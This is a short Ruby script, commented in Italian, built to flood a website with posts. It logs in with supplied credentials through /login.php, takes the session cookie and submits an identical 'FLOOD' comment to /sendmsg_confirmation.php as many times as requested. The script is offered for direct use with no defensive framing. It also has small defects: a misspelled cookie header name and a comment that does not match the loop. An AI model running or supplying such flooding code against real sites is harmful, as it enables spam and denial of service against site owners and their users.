
#Query web flodding comando: ruby Post_flood.rb <url> <username> <password> <int>

require 'net/http'

Target_URI = URI(ARGV[0])                                                                      #recupero i valori dei parametri dati in input al comando
Username = ARGV[1]
Password = ARGV[2]
Max_Comments = ARGV[3].to_i

http = Net::HTTP.new(Target_URI.hostname)                                                      #creo istanza http all'indirizzo in input
login_param = URI.encode_www_form({'user'=>Username,'pass'=>Password})                         #creo una referenza codificata con i parametri username e pass dati in input  
login_res = http.post("/login.php",login_param)                                                #creo una referenza di una chiamata POST con all'indirizzo login.php con i parametri passati
session_id = login_res['set cookie']                                                           #recupero il session_id dal parametro set-cookie della risposta (array)
flood_param = URI.encode_www_form({'name'=>'FLOOD','comment' =>'FROM RUBY','cat' =>'1'})       #creo una referenza ad una chiamata post che richiede parametri codificati  
(1..Max_Comments).each do 
    http.post("/sendmsg_confirmation.php",flood_param, 'cookie'=>session_id)                   #itera 50 tentativi di invio http.post con i parametri codificati e il session_id recuperato
end



